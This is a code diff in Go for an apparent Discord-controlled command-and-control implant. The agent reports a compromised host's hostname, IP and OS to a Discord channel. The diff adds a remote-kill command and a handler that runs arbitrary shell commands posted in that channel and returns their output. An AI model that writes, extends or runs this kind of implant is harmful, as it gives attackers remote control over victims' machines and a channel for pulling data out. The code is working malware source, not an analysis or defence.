@@ -42,8 +42,7 @@ func init() {
 
 func main() {
 	//TODO Do a check on the constant and produce a good error
-	
-	dg, err := discordgo.New("Bot " + constants.BotToken)
+	dg, err := discordgo.New("Bot " + util.BotToken)
 	if err != nil {
 		fmt.Println("error creating Discord session,", err)
 		return
@@ -57,7 +56,7 @@ func main() {
 		fmt.Println()
 	}
 
-	channelID, _ = dg.GuildChannelCreate(constants.ServerID, newAgent.IP, 0)
+	channelID, _ = dg.GuildChannelCreate(util.ServerID, newAgent.IP, 0)
 
 	sendMessage := "``` Hostname: " + newAgent.HostName + "\n IP:" + newAgent.IP + "\n OS:" + newAgent.OS + "```"
 	message, _ := dg.ChannelMessageSend(channelID.ID, sendMessage)
@@ -96,6 +95,33 @@ func main() {
 
 // This function is where we define custom commands for discordgo and system commands for the target
 func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
+	// Special case
+	if message.Author.Bot {
+		if message.Content == "kill" {
+			dg.ChannelDelete(channelID.ID)
+			os.Exit(0)
+		}
+	}
+
+	// Another special case
+	if len(message.MentionRoles) > 0 {
+		// PUT THIS IS A FUNCTION
+		println(message.Content)
+		if message.ChannelID == channelID.ID {
+			output := executeCommand(message.Content[22:])
+			if output == "" {
+				dg.ChannelMessageSend(message.ChannelID, "Command didn't return anything")
+			} else if len(output) > 2000 { // TODO Still doesn't output everything
+				firsthalf := output[:1900]
+				otherhalf := output[1900:]
+				dg.ChannelMessageSend(message.ChannelID, "```"+firsthalf+"```")
+				dg.ChannelMessageSend(message.ChannelID, "```"+otherhalf+"```")
+			} else {
+				dg.ChannelMessageSend(message.ChannelID, "```"+output+"```")
+			}
+		}
+	}
+
 	if !message.Author.Bot {
 		if message.ChannelID == channelID.ID {
 			if message.Content == "ping" {
